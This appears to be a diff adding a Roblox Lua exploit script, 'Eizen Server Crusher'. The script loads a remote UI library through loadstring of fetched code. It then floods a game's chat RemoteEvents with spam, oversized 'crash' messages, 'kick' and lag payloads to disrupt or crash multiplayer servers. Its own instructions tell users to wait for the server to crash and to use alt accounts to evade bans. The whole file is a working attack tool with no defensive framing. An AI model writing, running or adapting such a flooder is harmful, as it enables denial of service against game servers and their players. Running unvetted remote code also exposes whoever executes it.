@@ -1,0 +1,286 @@
+--// Eizen Server Crusher | Replicatestore SendChat Flooder
+--// Uses ReplicatedStorage.SendChat RemoteEvent to flood/crash server
+
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+--// Services
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TextChatService = game:GetService("TextChatService")
+local StarterGui = game:GetService("StarterGui")
+local CoreGui = game:GetService("CoreGui")
+local Player = Players.LocalPlayer
+
+--// Window
+local Window = Rayfield:CreateWindow({
+    Name = "Eizen Server Crusher",
+    LoadingTitle = "Eizen Crusher",
+    LoadingSubtitle = "SendChat Flooder",
+    ConfigurationSaving = {Enabled = false},
+    KeySystem = false
+})
+
+local MainTab = Window:CreateTab("Crusher", 4483362458)
+local SettingsTab = Window:CreateTab("Settings", 4483362458)
+local InfoTab = Window:CreateTab("Info", 4483362458)
+
+--// Settings
+getgenv().Crusher = {
+    Enabled = false,
+    Mode = "Spam",  -- Spam, Crash, Kick
+    Delay = 0.01,
+    Message = "Eizen Hub On Top 🔥",
+    UseSpam = true,
+    UseCrash = false,
+    UseKick = false,
+    UseLag = false,
+    ChatSpamCount = 100,
+    AutoRejoin = true
+}
+local S = getgenv().Crusher
+
+--// Find SendChat Remote
+local function FindSendChat()
+    -- Try common locations
+    local locations = {
+        ReplicatedStorage:FindFirstChild("SendChat"),
+        ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SendMessage") and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SendMessage"),
+        ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest") and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest"),
+        ReplicatedStorage:FindFirstChild("ChatEvents"):FindFirstChild("SendMessage"),
+        ReplicatedStorage:FindFirstChild("ChatRemotes"):FindFirstChild("SendChat"),
+        ReplicatedStorage:FindFirstChild("Modules"):FindFirstChild("Chat"):FindFirstChild("SendChat"),
+        ReplicatedStorage:FindFirstChild("Remotes"):FindFirstChild("SendChat"),
+        ReplicatedStorage:FindFirstChild("Events"):FindFirstChild("SendChat"),
+        ReplicatedStorage:FindFirstChild("SendMessage"),
+        ReplicatedStorage:FindFirstChild("ChatSend")
+    }
+
+    for _, remote in pairs(locations) do
+        if remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
+            return remote
+        end
+    end
+
+    -- Search all descendants
+    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+        if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
+            local name = v.Name:lower()
+            if name:find("sendchat") or name:find("sendmessage") or name:find("saymessage") or name:find("chat") then
+                return v
+            end
+        end
+    end
+
+    return nil
+end
+
+local SendChat = FindSendChat()
+
+--// Main Tab
+MainTab:CreateSection("Main Crusher")
+
+MainTab:CreateToggle({
+    Name = "Enable Server Crusher",
+    CurrentValue = false,
+    Flag = "Enabled",
+    Callback = function(v) S.Enabled = v end
+})
+
+MainTab:CreateInput({
+    Name = "Message to Spam",
+    PlaceholderText = "Enter message...",
+    RemoveTextAfterFocusLost = false,
+    Flag = "Message",
+    Callback = function(v) S.Message = v end
+})
+
+MainTab:CreateSlider({
+    Name = "Spam Delay (seconds)",
+    Range = {0.01, 1},
+    Increment = 0.01,
+    Suffix = "s",
+    CurrentValue = 0.01,
+    Flag = "Delay",
+    Callback = function(v) S.Delay = v end
+})
+
+MainTab:CreateSlider({
+    Name = "Spam Count per Loop",
+    Range = {1, 500},
+    Increment = 10,
+    Suffix = " msgs",
+    CurrentValue = 100,
+    Flag = "Count",
+    Callback = function(v) S.ChatSpamCount = v end
+})
+
+--// Settings Tab
+SettingsTab:CreateSection("Crusher Modes")
+
+SettingsTab:CreateToggle({
+    Name = "Chat Spam Mode",
+    CurrentValue = true,
+    Flag = "SpamMode",
+    Callback = function(v) S.UseSpam = v end
+})
+
+SettingsTab:CreateToggle({
+    Name = "Server Crash Mode",
+    CurrentValue = false,
+    Flag = "CrashMode",
+    Callback = function(v) S.UseCrash = v end
+})
+
+SettingsTab:CreateToggle({
+    Name = "Player Kick Mode",
+    CurrentValue = false,
+    Flag = "KickMode",
+    Callback = function(v) S.UseKick = v end
+})
+
+SettingsTab:CreateToggle({
+    Name = "Server Lag Mode",
+    CurrentValue = false,
+    Flag = "LagMode",
+    Callback = function(v) S.UseLag = v end
+})
+
+SettingsTab:CreateSection("Options")
+
+SettingsTab:CreateToggle({
+    Name = "Auto Rejoin after Crash",
+    CurrentValue = true,
+    Flag = "AutoRejoin",
+    Callback = function(v) S.AutoRejoin = v end
+})
+
+--// Info Tab
+InfoTab:CreateSection("Status")
+
+local StatusLabel = InfoTab:CreateLabel("SendChat Remote: Checking...")
+
+task.spawn(function()
+    while task.wait(1) do
+        if SendChat then
+            StatusLabel:Set("SendChat Remote: "..SendChat:GetFullName())
+        else
+            StatusLabel:Set("SendChat Remote: NOT FOUND")
+        end
+    end
+end)
+
+InfoTab:CreateSection("How to Use")
+InfoTab:CreateLabel("1. Enable 'Server Crusher'")
+InfoTab:CreateLabel("2. Set your message")
+InfoTab:CreateLabel("3. Adjust delay (0.01 = fastest)")
+InfoTab:CreateLabel("4. Wait for server to lag/crash")
+InfoTab:CreateLabel("")
+InfoTab:CreateLabel("WARNING: May get you BANNED!")
+InfoTab:CreateLabel("Use on alt accounts only")
+
+--// Main Crusher Loop
+task.spawn(function()
+    while task.wait() do
+        if S.Enabled and SendChat then
+            pcall(function()
+                if S.UseSpam then
+                    -- Spam mode
+                    for i = 1, S.ChatSpamCount do
+                        if not S.Enabled then break end
+
+                        pcall(function()
+                            if SendChat:IsA("RemoteEvent") then
+                                -- Try different argument patterns
+                                pcall(function() SendChat:FireServer(S.Message) end)
+                                pcall(function() SendChat:FireServer(S.Message, "All") end)
+                                pcall(function() SendChat:FireServer(S.Message, "All", false) end)
+                                pcall(function() SendChat:FireServer("All", S.Message) end)
+                            elseif SendChat:IsA("RemoteFunction") then
+                                pcall(function() SendChat:InvokeServer(S.Message) end)
+                                pcall(function() SendChat:InvokeServer(S.Message, "All") end)
+                            end
+                        end)
+
+                        task.wait(S.Delay)
+                    end
+                end
+
+                if S.UseCrash then
+                    -- Crash mode - send huge messages
+                    pcall(function()
+                        local huge = string.rep("A", 100000)
+                        if SendChat:IsA("RemoteEvent") then
+                            SendChat:FireServer(huge)
+                        else
+                            SendChat:InvokeServer(huge)
+                        end
+                    end)
+                end
+
+                if S.UseKick then
+                    -- Kick all players (if possible)
+                    pcall(function()
+                        for _, p in pairs(Players:GetPlayers()) do
+                            if p ~= Player then
+                                pcall(function()
+                                    if SendChat:IsA("RemoteEvent") then
+                                        SendChat:FireServer("/e "..string.rep("lol", 500), p.Name)
+                                    end
+                                end)
+                            end
+                        end
+                    end)
+                end
+
+                if S.UseLag then
+                    -- Lag server with spam
+                    pcall(function()
+                        for i = 1, 50 do
+                            if SendChat:IsA("RemoteEvent") then
+                                SendChat:FireServer(string.rep(S.Message, 100))
+                            end
+                        end
+                    end)
+                end
+            end)
+        end
+    end
+end)
+
+--// Auto Rejoin
+task.spawn(function()
+    while task.wait(5) do
+        if S.AutoRejoin and not Players.LocalPlayer then
+            task.wait(2)
+            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
+        end
+    end
+end)
+
+--// Refresh Remote finder
+SettingsTab:CreateButton({
+    Name = "Refresh SendChat Remote",
+    Callback = function()
+        SendChat = FindSendChat()
+        if SendChat then
+            Rayfield:Notify({Title = "Success", Content = "Found: "..SendChat:GetFullName(), Duration = 3})
+        else
+            Rayfield:Notify({Title = "Error", Content = "SendChat remote not found!", Duration = 3})
+        end
+    end
+})
+
+--// Notification
+if SendChat then
+    Rayfield:Notify({
+        Title = "Eizen Crusher",
+        Content = "SendChat found: "..SendChat.Name,
+        Duration = 5
+    })
+else
+    Rayfield:Notify({
+        Title = "Warning",
+        Content = "SendChat remote not found! Some games don't have it.",
+        Duration = 5
+    })
+end
